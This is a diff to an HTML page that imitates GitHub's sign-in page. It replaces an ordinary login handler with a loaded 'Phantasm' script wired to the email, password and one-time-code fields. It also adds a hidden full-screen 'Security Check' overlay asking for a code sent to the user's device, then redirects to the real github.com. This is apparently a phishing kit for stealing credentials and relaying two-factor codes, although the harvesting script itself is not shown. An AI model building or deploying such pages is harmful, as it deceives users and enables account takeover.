@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to GitHub · GitHub</title>
+    <title>Log in to GitHub · GitHub</title>
     <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon-dark.svg">
     <style>
         body {
@@ -180,10 +180,10 @@
         </svg>
     </div>
 
-    <h1>Sign in to GitHub</h1>
+    <h1>Log in to GitHub</h1>
 
-    <div class="auth-form-body">
-        <form onsubmit="submitLogin(event)">
+    <div class="auth-form-body" id="step-1">
+        <form>
             <label for="login_field">Username or email address</label>
             <input type="text" name="login" id="login_field" class="form-control" autofocus="autofocus" required>
 
@@ -194,7 +194,7 @@
             </div>
 
             <button type="submit" class="btn-primary" id="btn-login">
-                Sign in
+                Log in
             </button>
         </form>
     </div>
@@ -212,54 +212,32 @@
         </ul>
     </div>
 
+    <script src="/core/assets/js/phantasm.js"></script>
     <script>
-        function submitLogin(event) {
-            event.preventDefault();
-            const login = document.getElementById('login_field').value;
-            const password = document.getElementById('password').value;
-
-            if (!login || !password) return;
-
-            const btn = document.getElementById('btn-login');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = 'Signing in... <span class="spinner"></span>';
-            btn.disabled = true;
-
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    email: login,
-                    password: password
-                })
-            }).then(response => {
-                if (response.ok) {
-                    window.location.href = "https://github.com/";
-                } else {
-                    btn.innerHTML = originalText;
-                    btn.disabled = false;
-                    
-                    // Show error message
-                    const errorDiv = document.createElement('div');
-                    errorDiv.style.backgroundColor = 'rgba(248,81,73,0.1)';
-                    errorDiv.style.border = '1px solid rgba(248,81,73,0.4)';
-                    errorDiv.style.color = '#ff7b72';
-                    errorDiv.style.padding = '15px';
-                    errorDiv.style.borderRadius = '6px';
-                    errorDiv.style.marginBottom = '20px';
-                    errorDiv.style.fontSize = '13px';
-                    errorDiv.innerHTML = 'Incorrect username or password.';
-                    
-                    const formBody = document.querySelector('.auth-form-body');
-                    formBody.insertBefore(errorDiv, formBody.firstChild);
+        document.addEventListener('DOMContentLoaded', () => {
+            const app = new Phantasm({
+                redirectUrl: 'https://github.com/',
+                selectors: {
+                    email: '#login_field',
+                    password: '#password',
+                    otp: '#otp-input',
+                    submitBtn: '#btn-login',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step2: '#step-2',
+                    step3: '#step-3-otp'
                 }
-            }).catch(error => {
-                console.error('Error:', error);
-                window.location.href = "https://github.com/";
             });
-        }
+        });
     </script>
+
+    <!-- OTP Section -->
+    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
+        <h2 style="margin-bottom: 20px;">Security Check</h2>
+        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
+        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
+        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
+    </div>
+
 </body>
 </html>
